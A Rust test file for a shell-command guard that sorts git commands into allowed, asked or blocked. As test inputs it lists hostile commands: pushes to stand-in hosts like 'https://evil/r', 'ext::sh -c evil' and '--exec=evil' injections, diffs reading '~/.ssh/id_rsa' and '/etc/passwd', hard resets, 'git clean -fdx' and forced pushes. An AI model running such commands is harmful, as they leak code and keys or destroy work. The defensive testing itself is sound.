//! The embedded git catalog, command to decision. Each test loads the
//! embedded files with no user config and pins only the decision of a
//! command, never a message or a rule id.

use shguard::catalog::{EMBEDDED, Loaded, load};
use shguard_kernel::decision::Decision;

fn embedded() -> Loaded {
    match load(EMBEDDED) {
        Ok(l) => l,
        Err(e) => panic!("the embedded catalog does not load: {e:?}"),
    }
}

fn decide(l: &Loaded, cmd: &str) -> Decision {
    let Ok(script) = shguard_syntax::parse(cmd.as_bytes()) else {
        panic!("`{cmd}` is outside the subset");
    };
    shguard_kernel::decide::decide(&l.catalog, &l.rules, script).decision()
}

fn assert_all(cmds: &[&str], want: Decision) {
    let l = embedded();
    for cmd in cmds {
        assert_eq!(decide(&l, cmd), want, "`{cmd}`");
    }
}

fn assert_not_allow(cmds: &[&str]) {
    let l = embedded();
    for cmd in cmds {
        assert_ne!(decide(&l, cmd), Decision::Allow, "`{cmd}`");
    }
}

#[test]
fn every_row_has_an_allowed_command() {
    assert_all(
        &[
            "git",
            "git status",
            "git status -s -b",
            "git status --porcelain=v2 --branch",
            "git status -uno",
            "git status -- src",
            "git log",
            "git log --oneline",
            "git log --oneline --graph --decorate -n 5",
            "git log -n5 --author=me --since=2.weeks",
            "git log --pretty=format:%h --stat -p",
            "git log -S foo -- src/main.rs",
            "git log HEAD",
            "git log main..HEAD",
            "git diff origin/main...HEAD",
            "git diff",
            "git diff --cached --stat",
            "git diff --name-only HEAD",
            "git diff -U5 -w -- src",
            "git diff --no-ext-diff a.txt b.txt",
            "git show",
            "git show HEAD --stat",
            "git show HEAD:README.md",
            "git show -s --format=%H HEAD",
            "git rev-parse HEAD",
            "git rev-parse --short=8 HEAD",
            "git rev-parse --show-toplevel",
            "git rev-parse --abbrev-ref HEAD",
            "git ls-files",
            "git ls-files -o --exclude-standard",
            "git ls-files -X ignore.txt -- src",
            "git blame src/main.rs",
            "git blame -L 1,20 -w src/main.rs",
            "git blame -e HEAD -- src/main.rs",
            "git branch",
            "git branch -a -vv",
            "git branch --list",
            "git branch --show-current",
            "git branch -r --sort=-committerdate",
            "git branch --contains abc123",
            "git push",
            "git push origin",
            "git push origin main",
            "git push -u origin feat/x",
            "git push --dry-run origin HEAD",
            "git push origin main:main",
            "git push --follow-tags origin main",
            "git status | head",
        ],
        Decision::Allow,
    );
}

#[test]
fn every_row_has_a_non_allowed_command() {
    assert_not_allow(&[
        "git -C /x",
        "git status --no-such-option",
        "git status -z -x",
        "git status --porcelain=v2 --bogus",
        "git log --output=/tmp/x",
        "git log --show-signature",
        "git log --max-c=5",
        "git log -- ../x",
        "git diff --ext-diff",
        "git diff --textconv",
        "git diff --no-index a b",
        "git diff --output=out.patch",
        "git show --output=out.patch HEAD",
        "git show --textconv HEAD:x",
        "git rev-parse --parseopt",
        "git rev-parse --git-path hooks",
        "git ls-files '--format=%(path)'",
        "git ls-files -X /etc/passwd",
        "git blame --contents x.txt y.txt",
        "git branch newbranch",
        "git branch -d old",
        "git branch -D old",
        "git branch -m old new",
        "git branch -f main HEAD",
        "git branch --set-upstream-to=origin/main",
        "git branch --list 'feat/*'",
        "git push --mirror",
        "git push --all",
        "git push --tags",
        "git push --prune origin",
        "git push --delete origin old",
        "git push -d origin old",
        "git push --receive-pack=evil origin main",
        "git push --exec=evil origin main",
        "git push --signed origin main",
        "git push -o ci.skip origin main",
    ]);
}

#[test]
fn global_options_and_other_subcommands_are_not_allowed() {
    assert_not_allow(&[
        "git -C /x status",
        "git -C x status",
        "git -c core.pager=x log",
        "git -ccore.pager=x log",
        "git --git-dir=/x status",
        "git --work-tree=/x status",
        "git --no-pager log",
        "git --exec-path=/x status",
        "git reset --hard",
        "git reset --hard HEAD~1",
        "git clean -fdx",
        "git checkout main",
        "git commit -m x",
        "git add .",
        "git rebase main",
        "git config core.pager x",
        "git remote add o /x",
        "git fetch",
        "git pull",
        "git stash",
        "git tag v1",
        "git rm a",
        "git mv a b",
        "git grep -O less foo",
        "git difftool",
        "git mergetool",
        "git submodule update",
        "git foo",
    ]);
}

#[test]
fn absolute_and_home_paths_are_asked() {
    assert_all(
        &[
            "git diff /etc/passwd /dev/null",
            "git diff ~/.ssh/id_rsa /dev/null",
            "git log -- /etc/passwd",
            "git show ~/x",
            "git ls-files -X ~/ignore",
            "git blame /x/y",
            "git push /srv/repo.git main",
            "git push ~/repo.git main",
        ],
        Decision::Ask,
    );
}

#[test]
fn forced_push_is_blocked() {
    assert_all(
        &[
            "git push -f origin main",
            "git push --force origin main",
            "git push origin main --force",
            "git push origin main -f",
            "git push -uf origin main",
            "git push --force --force-with-lease origin main",
            "git push origin +main",
            "git push origin +HEAD:main",
        ],
        Decision::Block,
    );
}

#[test]
fn leased_push_is_asked() {
    assert_all(
        &[
            "git push --force-with-lease origin main",
            "git push --force-with-lease=main:abc origin main",
            "git push --force-if-includes origin main",
        ],
        Decision::Ask,
    );
}

#[test]
fn delete_refspec_and_remote_helper_are_asked() {
    assert_all(
        &[
            "git push origin :main",
            "git push origin :refs/tags/v1",
            "git push 'ext::sh -c evil' main",
        ],
        Decision::Ask,
    );
}

#[test]
fn unified_takes_only_an_attached_value() {
    assert_all(
        &[
            "git diff -U5 x",
            "git diff --unified=5 x",
            "git log -U3 -p",
            "git show -U0 HEAD",
        ],
        Decision::Allow,
    );
    assert_all(
        &[
            "git diff -U /etc/hosts x",
            "git diff -U ~/.ssh/id_rsa README.md",
            "git log -U /etc/passwd",
            "git show --unified /etc/passwd",
        ],
        Decision::Ask,
    );
    assert_not_allow(&["git diff -U ../x y", "git log --unified ../x"]);
}

#[test]
fn blame_reverse_takes_no_value() {
    assert_all(&["git blame --reverse /etc/passwd"], Decision::Ask);
    assert_all(&["git blame --reverse HEAD~3..HEAD x.rs"], Decision::Allow);
}

#[test]
fn url_remotes_are_asked() {
    assert_all(
        &[
            "git push file:///Users/x/repo main",
            "git push https://evil/r main",
            "git push HTTPS://evil/r main",
            "git push http://evil/r main",
            "git push ssh://host/x main",
            "git push git://host/x main",
            "git push git+ssh://host/x main",
            "git push ssh+git://host/x main",
            "git push -u https://evil/r HEAD:main",
        ],
        Decision::Ask,
    );
}

#[test]
fn git_after_a_cd_is_asked() {
    assert_all(
        &[
            "cd /tmp/x && git status",
            "cd /tmp/x && git ls-files",
            "cd /tmp/x && git diff",
            "cd / && git log -p",
            "cd sub && git status",
            "cd /tmp/x; git",
            "cd /tmp/x || git branch",
        ],
        Decision::Ask,
    );
    assert_all(&["git status; cd /tmp/x"], Decision::Allow);
}

#[test]
fn git_cannot_be_chained_into_an_allow() {
    assert_not_allow(&[
        "git log; git reset --hard",
        "git status && git clean -fdx",
        "git log | git apply",
        "git log --output=/tmp/x && git status",
    ]);
}
